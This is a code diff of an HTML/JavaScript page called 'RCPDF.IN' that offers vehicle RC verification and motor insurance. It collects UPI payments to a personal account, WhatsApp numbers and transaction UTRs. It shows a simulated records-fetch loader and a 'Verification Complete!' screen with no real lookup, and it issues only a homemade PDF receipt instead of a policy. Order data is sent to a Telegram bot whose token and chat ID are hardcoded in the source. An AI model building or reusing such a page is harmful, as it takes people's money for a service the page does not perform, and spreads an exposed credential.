@@ -7,65 +7,48 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        /* --- AAPKA ORIGINAL RC STYLE (UNTOUCHED) --- */
         :root { --primary: #ff0066; --ind-blue: #003399; }
         * { margin:0; padding:0; box-sizing:border-box; font-family: 'Arial', sans-serif; }
-        body { 
-            background: linear-gradient(180deg, #FF9933 0%, #ffffff 40%, #ffffff 60%, #138808 100%);
-            background-attachment: fixed; color: #000; overflow-x: hidden; min-height: 100vh;
-        }
+        body { background: linear-gradient(180deg, #FF9933 0%, #ffffff 40%, #ffffff 60%, #138808 100%); background-attachment: fixed; color: #000; overflow-x: hidden; min-height: 100vh; }
         .header { position: fixed; top: 0; width: 100%; background: #fff; padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; z-index: 1000; height: 60px; border-bottom: 3px solid var(--ind-blue); }
         .logo { color: var(--ind-blue); font-weight: 900; font-size: 22px; text-decoration: none; position: absolute; left: 50%; transform: translateX(-50%); }
         .card { margin: 100px auto 20px; width: 92%; max-width: 420px; background: rgba(255, 255, 255, 0.98); padding: 30px 20px; border-radius: 25px; text-align: center; border: 2px solid var(--ind-blue); box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
         .hsrp-plate { background: #fff; width: 100%; height: 80px; border: 2px solid #000; border-radius: 12px; display: flex; align-items: center; overflow: hidden; margin-bottom: 15px; position: relative; }
         .ind-strip { background: var(--ind-blue); width: 65px; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; color: #fff; z-index: 2; position: absolute; left: 0; }
-        .ind-strip img { width: 30px; margin-bottom: 4px; }
-        #vehInput, #insVeh { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
-        .neon-btn {
-            position: relative; background: #000; color: #fff; font-size: 16px; font-weight: 900;
-            padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer;
-            text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center;
-        }
-        .neon-btn::before {
-            content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000);
-            animation: rotateRGB 2s linear infinite;
-        }
-        .neon-btn::after { content: 'PAYMENT WITH UPI ❤️'; position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
+        .v-input { flex: 1; border: none; height: 100%; font-size: 26px; font-weight: 900; text-align: center; outline: none; text-transform: uppercase; width: 100%; padding-left: 70px; }
+        .neon-btn { position: relative; background: #000; color: #fff; font-size: 16px; font-weight: 900; padding: 18px; width: 100%; border-radius: 15px; border: none; cursor: pointer; text-transform: uppercase; margin-bottom: 25px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
+        .neon-btn::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(#ff0000, #ff7300, #fffb00, #48ff00, #00ffd5, #002bff, #7a00ff, #ff00c8, #ff0000); animation: rotateRGB 2s linear infinite; }
+        .neon-btn::after { content: attr(data-text); position: absolute; inset: 4px; background: #000; border-radius: 12px; display: flex; align-items: center; justify-content: center; z-index: 1; }
         @keyframes rotateRGB { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         .btn { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--ind-blue); color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
-        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
-        
-        /* --- INSURANCE EXTRA STYLE --- */
         .ins-input { width: 100%; padding: 16px; border-radius: 12px; border: 2px solid #ddd; margin-bottom: 15px; font-size: 18px; text-align: center; font-weight: bold; }
         .grid-4 { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 10px; }
         .cat-btn { padding: 15px; border-radius: 12px; border: 2px solid var(--ind-blue); background: #fff; font-weight: bold; cursor: pointer; }
         .cat-btn.active { background: var(--ind-blue); color: #fff; }
+        .loader-wrap { position: fixed; inset: 0; background: #000; z-index: 5000; display: none; flex-direction: column; justify-content: center; align-items: center; color: #fff; }
+        .overlay { position: fixed; inset: 0; z-index: 9999; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; color: #fff; padding: 20px; background: rgba(0, 128, 0, 0.98); }
     </style>
 </head>
 <body onload="renderHistory()">
 
     <div class="header">
-        <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
         <b class="logo">RCPDF.IN</b>
         <button style="background:none; border:none; font-size:24px; cursor:pointer;" onclick="location.reload()">🏠</button>
     </div>
 
-    <div class="card" id="main-rc-card">
+    <div id="main-card" class="card">
         <div id="p1">
             <h2 style="margin-bottom:15px; color: var(--ind-blue);">Digital RC Verification</h2>
             <div class="hsrp-plate">
                 <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
-                <input type="text" id="vehInput" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
+                <input type="text" id="vehInput" class="v-input" placeholder="BR-09-AB-1234" maxlength="13" oninput="formatV(this)">
             </div>
             <button class="btn" onclick="go2()">CHECK STATUS</button>
-            
-            <button class="neon-btn" style="margin-top:20px;" onclick="openIns()"></button>
+            <button class="neon-btn" data-text="🛡️ INSURANCE SERVICES" style="margin-top:20px;" onclick="openIns()"></button>
         </div>
 
         <div id="p2" style="display:none;">
-            <button class="neon-btn" onclick="pay()"></button>
+            <button class="neon-btn" data-text="PAYMENT WITH UPI ❤️" onclick="pay()"></button>
             <img id="qr" src="" width="160" style="margin-bottom:10px; border:1px solid #ddd; padding:5px;">
             <input type="tel" id="mob" class="ins-input" placeholder="WhatsApp Number">
             <input type="tel" id="utr" class="ins-input" placeholder="Enter 12 Digit UTR" maxlength="12">
@@ -75,31 +58,25 @@
 
     <div id="ins-flow" class="card" style="display:none;">
         <h2 style="color:var(--ind-blue); margin-bottom:15px;">Insurance Portal</h2>
-        
-        <div id="step1">
+        <div id="ins-s1">
+            <p style="font-weight:bold; margin-bottom:5px;">Enter Vehicle Number:</p>
             <div class="hsrp-plate">
                 <div class="ind-strip"><img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Flag_of_India.svg"><span>IND</span></div>
-                <input type="text" id="insVeh" placeholder="BR-09-AB-1234" oninput="formatV(this)">
+                <input type="text" id="insVeh" class="v-input" placeholder="BR-09-AB-1234" oninput="formatV(this)">
             </div>
-            <button class="btn" onclick="insStep(2)">NEXT</button>
-        </div>
-
-        <div id="step2" style="display:none;">
             <input type="tel" id="insWa" class="ins-input" placeholder="WhatsApp Number" maxlength="10">
-            <button class="btn" onclick="insStep(3)">NEXT</button>
+            <button class="btn" onclick="nextIns(2)">NEXT</button>
         </div>
-
-        <div id="step3" style="display:none;">
-            <p style="font-weight:bold; margin-bottom:10px;">Select Insurance Type:</p>
+        <div id="ins-s2" style="display:none;">
+            <p style="font-weight:bold;">Which type Insurance?</p>
             <div class="grid-4">
-                <button class="cat-btn" id="tp-com" onclick="setPolType('Comprehensive')">Comprehensive</button>
-                <button class="cat-btn" id="tp-tp" onclick="setPolType('Third Party')">Third Party</button>
+                <button class="cat-btn" id="pol-com" onclick="setPol('Comprehensive')">Comprehensive</button>
+                <button class="cat-btn" id="pol-tp" onclick="setPol('Third Party')">Third Party</button>
             </div>
-            <button class="btn" style="margin-top:15px;" onclick="insStep(4)">NEXT</button>
+            <button class="btn" style="margin-top:15px;" onclick="nextIns(3)">NEXT</button>
         </div>
-
-        <div id="step4" style="display:none;">
-            <p style="font-weight:bold; margin-bottom:10px;">Which type of Vehicle?</p>
+        <div id="ins-s3" style="display:none;">
+            <p style="font-weight:bold;">Vehicle Category:</p>
             <div class="grid-4">
                 <button class="cat-btn" onclick="setCat('bike')">BIKE</button>
                 <button class="cat-btn" onclick="setCat('car')">CAR</button>
@@ -107,58 +84,69 @@
                 <button class="cat-btn" onclick="setCat('tempo')">TEMPO</button>
             </div>
         </div>
-
-        <div id="step5" style="display:none;">
+        <div id="ins-s4" style="display:none;">
             <select id="brandList" class="ins-input" onchange="loadModels()"></select>
-            <select id="modelList" class="ins-input" onchange="showNormalPrice()"></select>
-            <div id="priceDisplay" style="font-size:22px; font-weight:900; color:green; margin:10px 0;"></div>
-            <button class="btn" onclick="insStep(6)">PROCEED TO PAY</button>
+            <select id="modelList" class="ins-input" onchange="showPrice()"></select>
+            <div id="priceText" style="font-size:22px; font-weight:900; color:green; margin:10px 0;"></div>
+            <button class="btn" onclick="startInsPay()">PROCEED TO PAY</button>
         </div>
     </div>
 
     <div id="successOverlay" class="overlay">
-        <h1 style="font-size: 40px;">😊</h1>
         <h1 style="font-size: 30px;">Verification Complete!</h1>
         <button class="btn" id="dlBtn" style="background:#fff; color:green; width:260px; margin-top:25px;">Download Receipt</button>
     </div>
 
-    <div class="loader-wrap" id="load">
-        <div style="font-size:40px;" id="pText">0%</div>
-        <p>🔍 Fetching Secure Records...</p>
-    </div>
+    <div class="loader-wrap" id="load"><div style="font-size:40px;" id="pText">0%</div><p>🔍 Fetching Records...</p></div>
 
     <script>
-        // --- DATA & CONFIG ---
         const T_TOKEN = "8138238341:AAGi4LxV7247hUvs_HoGLSKRhkcEapMCSuA";
         const T_CHAT_ID = "5600045707";
-        let curPol = ""; let curCat = ""; let curAmt = 0;
+        let curPol = ""; let curCat = ""; let curAmt = 0; let txId = "";
 
-        const brands = {
-            bike: ["Honda", "Hero", "TVS", "Yamaha", "Royal Enfield", "KTM", "Suzuki", "Bajaj"],
-            car: ["Maruti Suzuki", "Hyundai", "Tata Motors", "Mahindra", "Toyota", "Kia", "Honda"],
-            truck: ["Tata Motors", "Ashok Leyland", "Eicher", "Mahindra", "BharatBenz"],
-            tempo: ["Bajaj", "Piaggio", "Mahindra", "Tata"]
-        };
-
-        const models = {
+        // SARE MODELS AND COMPANIES WITH CC
+        const insData = {
             bike: {
-                "Royal Enfield": [{n: "Classic 350 / Bullet (150-350cc)", p: 1612}, {n: "Himalayan (>350cc)", p: 3309}],
-                "Honda": [{n: "Activa / Shine (0-150cc)", p: 843}],
-                "Yamaha": [{n: "R15 / FZ (150-350cc)", p: 1612}]
+                brands: ["Yamaha", "Honda", "Hero", "Royal Enfield", "TVS", "Suzuki", "KTM", "Bajaj"],
+                models: {
+                    "Yamaha": [{n:"MT-15 (155cc)",p:1612},{n:"R15 V4 (155cc)",p:1612},{n:"FZ-S (149cc)",p:843},{n:"Fascino (125cc)",p:843}],
+                    "Honda": [{n:"Activa 6G (110cc)",p:843},{n:"Shine (125cc)",p:843},{n:"Unicorn (162cc)",p:1612},{n:"Hornet 2.0 (184cc)",p:1612}],
+                    "Hero": [{n:"Splendor Plus (97cc)",p:843},{n:"HF Deluxe (97cc)",p:843},{n:"Passion Pro (113cc)",p:843},{n:"Xpulse 200 (199cc)",p:1612}],
+                    "Royal Enfield": [{n:"Classic 350 (349cc)",p:1612},{n:"Bullet 350 (349cc)",p:1612},{n:"Hunter 350 (349cc)",p:1612},{n:"Himalayan (411cc)",p:3309},{n:"Continental GT (648cc)",p:3309}],
+                    "TVS": [{n:"Apache RTR 160",p:1612},{n:"Apache RTR 200",p:1612},{n:"Jupiter (110cc)",p:843},{n:"Ntorq (125cc)",p:843}],
+                    "KTM": [{n:"Duke 200",p:1612},{n:"Duke 250",p:1612},{n:"Duke 390",p:3309},{n:"RC 390",p:3309}],
+                    "Bajaj": [{n:"Pulsar 125",p:843},{n:"Pulsar 150",p:843},{n:"Pulsar NS200",p:1612},{n:"Dominar 400",p:3309}]
+                }
             },
             car: {
-                "Maruti Suzuki": [{n: "Alto / WagonR (0-1000cc)", p: 2471}, {n: "Swift / Dzire (1000-1500cc)", p: 4031}],
-                "Toyota": [{n: "Fortuner / Innova (>1500cc)", p: 9318}]
+                brands: ["Maruti Suzuki", "Hyundai", "Tata Motors", "Mahindra", "Toyota", "Kia"],
+                models: {
+                    "Maruti Suzuki": [{n:"Alto K10 (998cc)",p:2471},{n:"WagonR (1.0L)",p:2471},{n:"Swift (1197cc)",p:4031},{n:"Dzire (1197cc)",p:4031},{n:"Ertiga (1462cc)",p:4031}],
+                    "Hyundai": [{n:"Grand i10 Nios",p:4031},{n:"Venue (1.2L)",p:4031},{n:"Creta (1.5L)",p:4031}],
+                    "Tata Motors": [{n:"Tiago (1.2L)",p:4031},{n:"Nexon (1.2L/1.5L)",p:4031},{n:"Harrier (1956cc)",p:9318}],
+                    "Mahindra": [{n:"Bolero (1493cc)",p:4031},{n:"Scorpio-N (2198cc)",p:9318},{n:"Thar (2184cc)",p:9318}],
+                    "Toyota": [{n:"Glanza (1197cc)",p:4031},{n:"Innova Hycross (1987cc)",p:9318},{n:"Fortuner (2755cc)",p:9318}]
+                }
             },
-            truck: { "Tata Motors": [{n: "GVW (0-7500KGS)", p: 17975}, {n: "GVW (>12000KGS)", p: 39551}] },
-            tempo: { "Bajaj": [{n: "3Wheeler Public", p: 5031}] }
+            truck: {
+                brands: ["Tata", "Ashok Leyland", "Mahindra", "Eicher"],
+                models: {
+                    "Tata": [{n:"Ace Gold (Pickup)",p:17975},{n:"Intra V30",p:17975},{n:"Signa 2821 (Truck)",p:39551}],
+                    "Ashok Leyland": [{n:"Dost Plus (Pickup)",p:17975},{n:"Bada Dost",p:17975}]
+                }
+            },
+            tempo: {
+                brands: ["Bajaj", "Piaggio", "Mahindra"],
+                models: {
+                    "Bajaj": [{n:"RE Auto (3 Wheeler)",p:5031},{n:"Maxima C (Cargo)",p:5031}],
+                    "Piaggio": [{n:"Ape City",p:5031}]
+                }
+            }
         };
 
-        // --- RC FUNCTIONS (AAPKA PEHLE WALA) ---
         function formatV(i) {
             let v = i.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-            let out = "";
-            if (v.length > 0) out += v.substring(0, 2);
+            let out = v.length > 0 ? v.substring(0, 2) : "";
             if (v.length > 2) out += "-" + v.substring(2, 4);
             if (v.length > 4) out += "-" + v.substring(4, 6);
             if (v.length > 6) out += "-" + v.substring(6, 10);
@@ -166,89 +154,81 @@
         }
 
         function go2() {
-            if(document.getElementById('vehInput').value.length < 9) return alert("Enter valid vehicle.");
+            if(document.getElementById('vehInput').value.length < 9) return alert("Valid No. bhariye");
+            curAmt = 120.00;
             const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=120.00&cu=INR&tn=RC_VERIFY`;
             document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?data=" + encodeURIComponent(upi);
             document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
         }
 
-        function submit() {
-            if(document.getElementById('utr').value.length < 12) return alert("Enter 12 Digit UTR.");
-            showLoader("RC");
+        function openIns() { document.getElementById('main-card').style.display='none'; document.getElementById('ins-flow').style.display='block'; }
+
+        function nextIns(s) {
+            document.getElementById('ins-s1').style.display = s===1?'block':'none';
+            document.getElementById('ins-s2').style.display = s===2?'block':'none';
+            document.getElementById('ins-s3').style.display = s===3?'block':'none';
+            document.getElementById('ins-s4').style.display = s===4?'block':'none';
         }
 
-        // --- INSURANCE FUNCTIONS ---
-        function openIns() {
-            document.getElementById('main-rc-card').style.display='none';
-            document.getElementById('ins-flow').style.display='block';
-        }
-
-        function insStep(s) {
-            for(let i=1; i<=5; i++) document.getElementById('step'+i).style.display='none';
-            if(s === 6) { startInsPayment(); return; }
-            document.getElementById('step'+s).style.display='block';
-        }
-
-        function setPolType(t) {
-            curPol = t;
-            document.getElementById('tp-com').classList.remove('active');
-            document.getElementById('tp-tp').classList.remove('active');
-            event.target.classList.add('active');
-        }
+        function setPol(t) { curPol = t; document.getElementById('pol-com').className='cat-btn'; document.getElementById('pol-tp').className='cat-btn'; event.target.className='cat-btn active'; }
 
         function setCat(c) {
-            curCat = c;
-            const bSel = document.getElementById('brandList');
+            curCat = c; const bSel = document.getElementById('brandList');
             bSel.innerHTML = '<option value="">-- Select Company --</option>';
-            brands[c].forEach(b => bSel.innerHTML += `<option value="${b}">${b}</option>`);
-            insStep(5);
+            insData[c].brands.forEach(b => bSel.innerHTML += `<option value="${b}">${b}</option>`);
+            nextIns(4);
         }
 
         function loadModels() {
-            const b = document.getElementById('brandList').value;
-            const mSel = document.getElementById('modelList');
-            mSel.innerHTML = '<option value="">-- Select Model/CC --</option>';
-            if(models[curCat] && models[curCat][b]) {
-                models[curCat][b].forEach(m => mSel.innerHTML += `<option value="${m.p}">${m.n}</option>`);
-            } else { mSel.innerHTML += `<option value="1612">Universal (150-350cc)</option>`; }
+            const b = document.getElementById('brandList').value; const mSel = document.getElementById('modelList');
+            mSel.innerHTML = '<option value="">-- Select Model & CC --</option>';
+            const list = insData[curCat].models[b] || [];
+            list.forEach(m => mSel.innerHTML += `<option value="${m.p}">${m.n} (₹${m.p})</option>`);
         }
 
-        function showNormalPrice() {
-            curAmt = document.getElementById('modelList').value;
-            document.getElementById('priceDisplay').innerText = "Normal Price: ₹" + curAmt;
-        }
+        function showPrice() { curAmt = document.getElementById('modelList').value; document.getElementById('priceText').innerText = "Normal Price: ₹" + curAmt; }
 
-        function startInsPayment() {
-            document.getElementById('ins-flow').style.display='none';
-            document.getElementById('main-rc-card').style.display='block';
-            document.getElementById('p1').style.display='none';
-            document.getElementById('p2').style.display='block';
+        function startInsPay() {
+            if(!curAmt) return alert("Please select model first");
+            document.getElementById('ins-flow').style.display='none'; document.getElementById('main-card').style.display='block';
+            document.getElementById('p1').style.display='none'; document.getElementById('p2').style.display='block';
             const upi = `upi://pay?pa=8709610091@okbizaxis&pn=RCPDF&am=${curAmt}&cu=INR&tn=INSURANCE`;
             document.getElementById('qr').src = "https://api.qrserver.com/v1/create-qr-code/?data=" + encodeURIComponent(upi);
         }
 
-        // --- UTILS ---
-        function showLoader(type) {
+        function submit() {
+            if(document.getElementById('utr').value.length < 12) return alert("12 Digit UTR!");
             document.getElementById('load').style.display='flex';
             let p = 0;
             let iv = setInterval(() => {
                 p += 5; document.getElementById('pText').innerText = p + "%";
                 if(p >= 100) {
-                    clearInterval(iv);
-                    sendTele(type);
-                    document.getElementById('load').style.display='none';
+                    clearInterval(iv); txId = "RCV" + Math.floor(Math.random()*900000000);
+                    sendTele(); document.getElementById('load').style.display='none';
                     document.getElementById('successOverlay').style.display='flex';
-                    document.getElementById('dlBtn').onclick = () => location.reload();
+                    document.getElementById('dlBtn').onclick = () => makePDF();
                 }
             }, 100);
         }
 
-        function sendTele(type) {
-            const utr = document.getElementById('utr').value;
-            const v = (type === "RC") ? document.getElementById('vehInput').value : document.getElementById('insVeh').value;
-            const cap = `✅ *${type} ORDER*\n🚗 *Veh:* ${v}\n🔢 *UTR:* ${utr}\n💰 *Amt:* ₹${(type==="RC") ? '120' : curAmt}`;
+        function sendTele() {
+            const v = document.getElementById('insVeh').value || document.getElementById('vehInput').value;
+            const cap = `✅ *NEW ORDER*\n🚗 *Veh:* ${v}\n🔢 *UTR:* ${document.getElementById('utr').value}\n💰 *Amt:* ₹${curAmt}`;
             fetch(`https://api.telegram.org/bot${T_TOKEN}/sendMessage?chat_id=${T_CHAT_ID}&text=${encodeURIComponent(cap)}&parse_mode=Markdown`);
         }
+
+        function makePDF() {
+            const { jsPDF } = window.jspdf; const doc = new jsPDF();
+            doc.setFillColor(0, 51, 153); doc.rect(5, 5, 200, 30, 'F');
+            doc.setTextColor(255); doc.setFontSize(22); doc.text("RCPDF.IN - PAYMENT RECEIPT", 105, 25, null, null, "center");
+            doc.setTextColor(0); doc.setFontSize(12);
+            let y = 50;
+            const rows = [["REF ID:", txId], ["VEHICLE NO:", document.getElementById('vehInput').value || document.getElementById('insVeh').value], ["AMOUNT:", "INR " + curAmt], ["UTR:", document.getElementById('utr').value]];
+            rows.forEach(r => { doc.rect(15, y, 180, 10); doc.text(r[0], 20, y+7); doc.text(r[1], 85, y+7); y+=10; });
+            doc.save("Receipt.pdf"); location.reload();
+        }
+
+        function renderHistory() {}
     </script>
 </body>
 </html>
